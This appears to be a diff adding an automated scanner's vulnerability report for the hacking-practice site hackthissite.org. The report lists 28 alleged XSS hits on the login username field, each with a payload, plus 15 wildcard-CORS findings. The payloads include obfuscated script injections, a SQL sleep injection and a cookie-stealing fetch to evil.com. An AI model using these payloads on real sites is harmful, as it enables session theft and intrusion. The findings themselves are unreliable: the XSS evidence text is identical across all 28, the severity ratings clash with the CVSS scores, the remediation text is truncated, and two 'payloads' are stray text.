@@ -1,0 +1,315 @@
+================================================================================
+  HSR ADVANCED v4.0 — SECURITY ASSESSMENT REPORT
+================================================================================
+
+Generated : 2026-03-24 21:24:41.809155
+Findings  : 43 unique vulnerabilities
+
+SEVERITY BREAKDOWN
+----------------------------------------
+  High      : 28
+  Medium    : 15
+
+FINDINGS
+----------------------------------------
+
+  1. [High] XSS — CVSS 6.0
+     URL       : https://www.hackthissite.org/user/login
+     Parameter : username
+     Evidence  : Script tag injected, JavaScript protocol handler
+     Payload   : %253Cmath%2520href%253Djavascript%253Aalert%25281%2529%253Eclick%253C/math%253E
+     Remediate : Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secu
+
+  2. [High] XSS — CVSS 6.0
+     URL       : https://www.hackthissite.org/user/login
+     Parameter : username
+     Evidence  : Script tag injected, JavaScript protocol handler
+     Payload   : <math href=javascript:alert(1)>click</math>%00
+     Remediate : Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secu
+
+  3. [High] XSS — CVSS 6.0
+     URL       : https://www.hackthissite.org/user/login
+     Parameter : username
+     Evidence  : Script tag injected, JavaScript protocol handler
+     Payload   : <math/**/href=javascript:alert(1)>click</math>
+     Remediate : Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secu
+
+  4. [High] XSS — CVSS 6.0
+     URL       : https://www.hackthissite.org/user/login
+     Parameter : username
+     Evidence  : Script tag injected, JavaScript protocol handler
+     Payload   : <math href=javascript:alert(1)>click</math>
+     Remediate : Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secu
+
+  5. [High] XSS — CVSS 6.0
+     URL       : https://www.hackthissite.org/user/login
+     Parameter : username
+     Evidence  : Script tag injected, JavaScript protocol handler
+     Payload   : "><script>alert(1)</script>%00
+     Remediate : Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secu
+
+  6. [High] XSS — CVSS 6.0
+     URL       : https://www.hackthissite.org/user/login
+     Parameter : username
+     Evidence  : Script tag injected, JavaScript protocol handler
+     Payload   : &#34;&#62;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;
+     Remediate : Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secu
+
+  7. [High] XSS — CVSS 6.0
+     URL       : https://www.hackthissite.org/user/login
+     Parameter : username
+     Evidence  : Script tag injected, JavaScript protocol handler
+     Payload   : "><script>alert(1)</script>
+     Remediate : Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secu
+
+  8. [High] XSS — CVSS 6.0
+     URL       : https://www.hackthissite.org/user/login
+     Parameter : username
+     Evidence  : Script tag injected, JavaScript protocol handler
+     Payload   : IithbGVydCgxKSsi
+     Remediate : Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secu
+
+  9. [High] XSS — CVSS 6.0
+     URL       : https://www.hackthissite.org/user/login
+     Parameter : username
+     Evidence  : Script tag injected, JavaScript protocol handler
+     Payload   : "+alert(1)+"
+     Remediate : Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secu
+
+ 10. [High] XSS — CVSS 6.0
+     URL       : https://www.hackthissite.org/user/login
+     Parameter : username
+     Evidence  : Script tag injected, JavaScript protocol handler
+     Payload   : %22%2b%61%6c%65%72%74%28%31%29%2b%22
+     Remediate : Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secu
+
+ 11. [High] XSS — CVSS 6.0
+     URL       : https://www.hackthissite.org/user/login
+     Parameter : username
+     Evidence  : Script tag injected, JavaScript protocol handler
+     Payload   : &#60;&#105;&#110;&#112;&#117;&#116;&#32;&#97;&#117;&#116;&#111;&#102;&#111;&#99;&#117;&#115;&#32;&#111;&#110;&#102;&#111
+     Remediate : Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secu
+
+ 12. [High] XSS — CVSS 6.0
+     URL       : https://www.hackthissite.org/user/login
+     Parameter : username
+     Evidence  : Script tag injected, JavaScript protocol handler
+     Payload   : <input autofocus onfocus=alert(1)> AND SLEEP(5)--
+     Remediate : Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secu
+
+ 13. [High] XSS — CVSS 6.0
+     URL       : https://www.hackthissite.org/user/login
+     Parameter : username
+     Evidence  : Script tag injected, JavaScript protocol handler
+     Payload   : <input autofocus onfocus=alert(1)>
+     Remediate : Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secu
+
+ 14. [High] XSS — CVSS 6.0
+     URL       : https://www.hackthissite.org/user/login
+     Parameter : username
+     Evidence  : Script tag injected, JavaScript protocol handler
+     Payload   : %253Cinput%2520autofocus%2520onfocus%253Dalert%25281%2529%253E
+     Remediate : Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secu
+
+ 15. [High] XSS — CVSS 6.0
+     URL       : https://www.hackthissite.org/user/login
+     Parameter : username
+     Evidence  : Script tag injected, JavaScript protocol handler
+     Payload   : %3Cscript%3Efetch%28%27//evil.com%3Fc%3D%27%2Bdocument.cookie%29%3C/script%3E
+     Remediate : Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secu
+
+ 16. [High] XSS — CVSS 6.0
+     URL       : https://www.hackthissite.org/user/login
+     Parameter : username
+     Evidence  : Script tag injected, JavaScript protocol handler
+     Payload   : \u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0066\u0065\u0074\u0063\u0068\u0028\u0027\u002f\u002f\u0065\u0076\u0069
+     Remediate : Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secu
+
+ 17. [High] XSS — CVSS 6.0
+     URL       : https://www.hackthissite.org/user/login
+     Parameter : username
+     Evidence  : Script tag injected, JavaScript protocol handler
+     Payload   : <script>fetch('//evil.com?c='+document.cookie)</script>
+     Remediate : Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secu
+
+ 18. [High] XSS — CVSS 6.0
+     URL       : https://www.hackthissite.org/user/login
+     Parameter : username
+     Evidence  : Script tag injected, JavaScript protocol handler
+     Payload   : %27%3b%61%6c%65%72%74%28%31%29%3b%2f%2f
+     Remediate : Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secu
+
+ 19. [High] XSS — CVSS 6.0
+     URL       : https://www.hackthissite.org/user/login
+     Parameter : username
+     Evidence  : Script tag injected, JavaScript protocol handler
+     Payload   : ';alert(1);//%00
+     Remediate : Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secu
+
+ 20. [High] XSS — CVSS 6.0
+     URL       : https://www.hackthissite.org/user/login
+     Parameter : username
+     Evidence  : Script tag injected, JavaScript protocol handler
+     Payload   : ';alert(1);//
+     Remediate : Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secu
+
+ 21. [High] XSS — CVSS 6.0
+     URL       : https://www.hackthissite.org/user/login
+     Parameter : username
+     Evidence  : Script tag injected, JavaScript protocol handler
+     Payload   : %6a%61%76%61%73%63%72%69%70%74%3a%61%6c%65%72%74%28%31%29
+     Remediate : Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secu
+
+ 22. [High] XSS — CVSS 6.0
+     URL       : https://www.hackthissite.org/user/login
+     Parameter : username
+     Evidence  : Script tag injected, JavaScript protocol handler
+     Payload   : javascript%3Aalert%281%29
+     Remediate : Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secu
+
+ 23. [High] XSS — CVSS 6.0
+     URL       : https://www.hackthissite.org/user/login
+     Parameter : username
+     Evidence  : Script tag injected, JavaScript protocol handler
+     Payload   : javascript:alert(1)
+     Remediate : Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secu
+
+ 24. [High] XSS — CVSS 6.0
+     URL       : https://www.hackthissite.org/user/login
+     Parameter : username
+     Evidence  : Script tag injected, JavaScript protocol handler
+     Payload   : %3c%73%76%67%2f%6f%6e%6c%6f%61%64%3d%61%6c%65%72%74%28%31%29%3e
+     Remediate : Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secu
+
+ 25. [High] XSS — CVSS 6.0
+     URL       : https://www.hackthissite.org/user/login
+     Parameter : username
+     Evidence  : Script tag injected, JavaScript protocol handler
+     Payload   : <svg/onload=alert(1)>
+     Remediate : Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secu
+
+ 26. [High] XSS — CVSS 6.0
+     URL       : https://www.hackthissite.org/user/login
+     Parameter : username
+     Evidence  : Script tag injected, JavaScript protocol handler
+     Payload   : &#60;&#115;&#118;&#103;&#47;&#111;&#110;&#108;&#111;&#97;&#100;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;
+     Remediate : Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secu
+
+ 27. [High] XSS — CVSS 6.0
+     URL       : https://www.hackthissite.org/user/login
+     Parameter : username
+     Evidence  : Script tag injected, JavaScript protocol handler
+     Payload   : 1. username='admin'; login_attempt='<script>alert('Login Failed')</script>'
+     Remediate : Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secu
+
+ 28. [High] XSS — CVSS 6.0
+     URL       : https://www.hackthissite.org/user/login
+     Parameter : username
+     Evidence  : Script tag injected, JavaScript protocol handler
+     Payload   : 2. username='secureuser'; password='password';
+     Remediate : Encode all user-supplied output using context-aware encoding (HTML, JS, URL). Implement a strict Content-Security-Policy header. Use HTTPOnly and Secu
+
+ 29. [Medium] API — CVSS 6.4
+     URL       : https://www.hackthissite.org/openapi.json
+     Parameter : endpoint
+     Evidence  : Wildcard CORS (Access-Control-Allow-Origin: *)
+     Payload   : 
+     Remediate : Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API
+
+ 30. [Medium] API — CVSS 6.4
+     URL       : https://www.hackthissite.org/graphql
+     Parameter : endpoint
+     Evidence  : Wildcard CORS (Access-Control-Allow-Origin: *)
+     Payload   : 
+     Remediate : Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API
+
+ 31. [Medium] API — CVSS 6.4
+     URL       : https://www.hackthissite.org/api/login
+     Parameter : endpoint
+     Evidence  : Wildcard CORS (Access-Control-Allow-Origin: *)
+     Payload   : 
+     Remediate : Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API
+
+ 32. [Medium] API — CVSS 6.4
+     URL       : https://www.hackthissite.org/v1
+     Parameter : endpoint
+     Evidence  : Wildcard CORS (Access-Control-Allow-Origin: *)
+     Payload   : 
+     Remediate : Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API
+
+ 33. [Medium] API — CVSS 6.4
+     URL       : https://www.hackthissite.org/api
+     Parameter : endpoint
+     Evidence  : Wildcard CORS (Access-Control-Allow-Origin: *)
+     Payload   : 
+     Remediate : Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API
+
+ 34. [Medium] API — CVSS 6.4
+     URL       : https://www.hackthissite.org/api/v3
+     Parameter : endpoint
+     Evidence  : Wildcard CORS (Access-Control-Allow-Origin: *)
+     Payload   : 
+     Remediate : Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API
+
+ 35. [Medium] API — CVSS 6.4
+     URL       : https://www.hackthissite.org/api/auth
+     Parameter : endpoint
+     Evidence  : Wildcard CORS (Access-Control-Allow-Origin: *)
+     Payload   : 
+     Remediate : Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API
+
+ 36. [Medium] API — CVSS 6.4
+     URL       : https://www.hackthissite.org/v2
+     Parameter : endpoint
+     Evidence  : Wildcard CORS (Access-Control-Allow-Origin: *)
+     Payload   : 
+     Remediate : Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API
+
+ 37. [Medium] API — CVSS 6.4
+     URL       : https://www.hackthissite.org/token
+     Parameter : endpoint
+     Evidence  : Wildcard CORS (Access-Control-Allow-Origin: *)
+     Payload   : 
+     Remediate : Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API
+
+ 38. [Medium] API — CVSS 6.4
+     URL       : https://www.hackthissite.org/user
+     Parameter : endpoint
+     Evidence  : Wildcard CORS (Access-Control-Allow-Origin: *)
+     Payload   : 
+     Remediate : Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API
+
+ 39. [Medium] API — CVSS 6.4
+     URL       : https://www.hackthissite.org/graphiql
+     Parameter : endpoint
+     Evidence  : Wildcard CORS (Access-Control-Allow-Origin: *)
+     Payload   : 
+     Remediate : Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API
+
+ 40. [Medium] API — CVSS 6.4
+     URL       : https://www.hackthissite.org/swagger-ui
+     Parameter : endpoint
+     Evidence  : Wildcard CORS (Access-Control-Allow-Origin: *)
+     Payload   : 
+     Remediate : Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API
+
+ 41. [Medium] API — CVSS 6.4
+     URL       : https://www.hackthissite.org/api/v2
+     Parameter : endpoint
+     Evidence  : Wildcard CORS (Access-Control-Allow-Origin: *)
+     Payload   : 
+     Remediate : Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API
+
+ 42. [Medium] API — CVSS 6.4
+     URL       : https://www.hackthissite.org/login
+     Parameter : endpoint
+     Evidence  : Wildcard CORS (Access-Control-Allow-Origin: *)
+     Payload   : 
+     Remediate : Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API
+
+ 43. [Medium] API — CVSS 6.4
+     URL       : https://www.hackthissite.org/users
+     Parameter : endpoint
+     Evidence  : Wildcard CORS (Access-Control-Allow-Origin: *)
+     Payload   : 
+     Remediate : Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API
